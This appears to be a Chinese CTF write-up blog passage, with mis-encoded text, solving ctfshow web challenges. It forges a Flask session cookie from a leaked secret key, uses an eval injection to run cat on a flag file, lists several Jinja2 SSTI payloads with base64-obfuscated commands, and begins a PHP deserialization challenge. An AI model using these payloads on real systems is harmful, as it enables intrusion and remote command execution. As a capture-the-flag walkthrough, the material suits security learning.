</p><p><code>https://blog.csdn.net/since_2020/article/details/119543172</code></p><p>éšä¾¿ä¸€ä¸ªç”¨æˆ·æ³¨å†Œï¼Œ123/123ç™»å½•ä¸Šå»ï¼Œå¯ä»¥çœ‹åˆ°learnå¯ä»¥ç‚¹å‡»ï¼ŒæŸ¥çœ‹åˆ°æºä»£ç </p><p>æœ‰ä¸€ä¸ª<code>app.secret_key = &#39;S3cr3tK3y&#39;</code>æœ€ä¸ºæ˜¾çœ¼ï¼Œè”æƒ³åˆ°flask sessionä¼ªé€ ï¼Œ</p><p>å¯ä»¥é‡æ–°ç™»å½•æŠ“åŒ…ï¼Œçœ‹æ˜¯å¦æœ‰session</p><p>Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZC52mw.SomJhBqFTfEKGMkcqlorSxEhAHA</p><p>å¯ä»¥çœ‹åˆ°session jwtç›¸ä¼¼ç”¨<code>https://github.com/noraj/flask-session-cookie-manager</code>è¿™ä¸ªå·¥å…·å¯ä»¥è¿›è¡Œè§£å¯†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &quot;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMyJ9.ZC52mw.SomJhBqFTfEKGMkcqlorSxEhAHA&quot; -s &quot;S3cr3tK3y&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;loggedin&#x27;</span>: True, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰roleå€¼ä¸ºuserï¼Œæºç ä¸­æœªè§ç®¡ç†å‘˜çš„å­—æ ·ï¼Œç›²çŒœä¸ºadminï¼Œæ¥ç€æ„é€ åŒ…</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161237019.png" alt="image-20230406161237019"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py encode -s &quot;S3cr3tK3y&quot; -t &quot;&#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;123&#x27;&#125;&quot;</span></span><br><span class="line">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxMjMifQ.ZC5-7A.6id7rF3wmWSp5nux_ylHGAhfbn8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†æ„é€ å¥½çš„æ•°æ®è¿›è¡Œæ›¿æ¢sessionï¼Œè¿™æ ·</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161503735.png" alt="image-20230406161503735"></p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161453957.png" alt="image-20230406161453957"></p><p>å†æ¬¡è®¿é—®ä¸»é¡µé¢ï¼Œå³å¯çœ‹åˆ°ä¸»é¡µé¢å¤šäº†ä¸€ä¸ªä¸‹è½½çš„åœ°æ–¹ï¼Œ</p><p><a href="http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/download/?filename=fakeflag.txt%EF%BC%8C%E7%82%B9%E5%87%BB%E6%97%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%EF%BC%8C%E5%9C%A8%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9C%8B%E5%88%B0show%E7%9B%AE%E5%BD%95%E6%97%B6%EF%BC%8C%E5%B7%A6%E4%B8%8A%E8%A7%92%E6%9C%89%E4%B8%80%E4%B8%AAapp.py%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81">http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/download/?filename=fakeflag.txtï¼Œç‚¹å‡»æ—¶ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œæ¥ä¸‹æ¥å°±ä¸‹è½½æºç ï¼Œåœ¨æœ€å¼€å§‹çœ‹åˆ°showç›®å½•æ—¶ï¼Œå·¦ä¸Šè§’æœ‰ä¸€ä¸ªapp.pyç›´æ¥ä¸‹è½½ï¼Œä¸‹è½½åå¯ä»¥çœ‹åˆ°æºç </a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>helloè·¯ç”±å¤„æœ‰ä¸ªevalæ¼æ´ï¼Œè¿™æ ·ä¼ å‚æ˜¯å¾ˆå±é™©çš„ï¼Œ</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161902169.png" alt="image-20230406161902169"></p><p>å‚è€ƒ</p><p><code>https://www.anquanke.com/post/id/84891/</code></p><p>``<a href="http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen">http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen</a>(â€˜cat /flag_is_h3reâ€™).read()`</p><p>å³å¯</p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><p>å³é”®æºä»£ç æœ‰zipåŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hellodear</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> if â€œgeâ€ in name:<br>        return render_template_string(â€˜hello %sâ€™ % name)</p><p>payload è¦æœ‰  ge</p><p> elif â€œfâ€ not in name:<br>        return render_template_string(â€˜hello %sâ€™ % name)</p><p>payload ä¸èƒ½æœ‰f</p><p>å…ˆè·å–å¯ç”¨åŸºç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å››ç§æ–¹æ³•çš†å¯</span><br><span class="line">1,   &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br><span class="line">2,   &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">3,   &#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br><span class="line">4ï¼Œ &#123;&#123;().__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>è·å–åˆ°åï¼Œç”¨è„šæœ¬å—¦ä¸€ä¸‹å¯ç”¨çš„ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æŸ¥æ‰¾åˆ°çš„çˆ¶ç±»åˆ—è¡¨æ›¿æ¢åˆ°dataä¸­</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åœ¨è¿™é‡Œæ·»åŠ å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œä¸‹é¢ä¼šä»‹ç»è¿™äº›ç±»çš„åˆ©ç”¨æ–¹æ³•</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br></pre></td></tr></table></figure><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406171826914.png" alt="image-20230406171826914"></p><p>å¯ä»¥çœ‹åˆ°132çš„os._wrap_closeå¯ç”¨ popenä¹Ÿå¯ç”¨</p><p><code>http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code>å³å¯å‘½ä»¤æ‰§è¡Œ</p><p>ä½†æ˜¯ä¸‹é¢æ‰§è¡Œls / æ—¶å‡ å¥ä¸å¯ä»¥äº†ï¼Œæ˜¾ç¤º404</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls $(echo Lw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;$(echo bHM= | base64 -d) $(echo Lw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat $(echo Li4vZmxhZw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">å®˜æ–¹</span><br><span class="line">/hello/&#123;&#123; <span class="string">&quot;&quot;</span>.__class__.__base__ .__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](request.args.get(<span class="string">&quot;ctfshow&quot;</span>)).<span class="built_in">read</span>()&#125;&#125;ge?ctfshow=cat /flag </span><br><span class="line"></span><br><span class="line">POC1:</span><br><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">POC2:</span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">POC3:</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat $(echo Li4vZmxhZw== | base64 -d)').read()&#125;&#125;</code></p><h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h4><p>å¼€å±€ç»™äº†æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯ååºåˆ—åŒ–ï¼Œè¿™é‡Œè¦çŸ¥é“ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_construct() å½“åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘ï¼Œä¸€èˆ¬ç”¨äºåˆå§‹åŒ–å¯¹è±¡ï¼Œå¯¹å˜é‡èµ‹åˆå€¼</span><br><span class="line">__sleep() ä½¿ç”¨serialize()æ—¶è‡ªåŠ¨è§¦å‘ 